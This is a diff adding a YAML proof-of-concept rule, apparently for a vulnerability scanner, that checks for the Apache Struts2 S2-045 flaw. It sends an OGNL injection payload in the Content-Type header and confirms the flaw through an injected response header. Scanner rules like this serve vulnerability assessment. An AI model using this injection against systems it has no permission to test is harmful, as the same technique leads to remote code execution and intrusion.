@@ -1,0 +1,19 @@
+name: poc-yaml-struts2_045
+set:
+  int1: randomInt(800, 1000)
+  int2: randomInt(800, 1000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        Content-Type: ${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("Keyvalue",{{int1}}*{{int2}})}.multipart/form-data
+      follow_redirects: true
+    expression: |
+        "Keyvalue" in response.headers && response.headers["Keyvalue"].icontains(string(int1 * int2))
+expression: r0()
+detail:
+  links:
+    - https://paper.seebug.org/247/
+
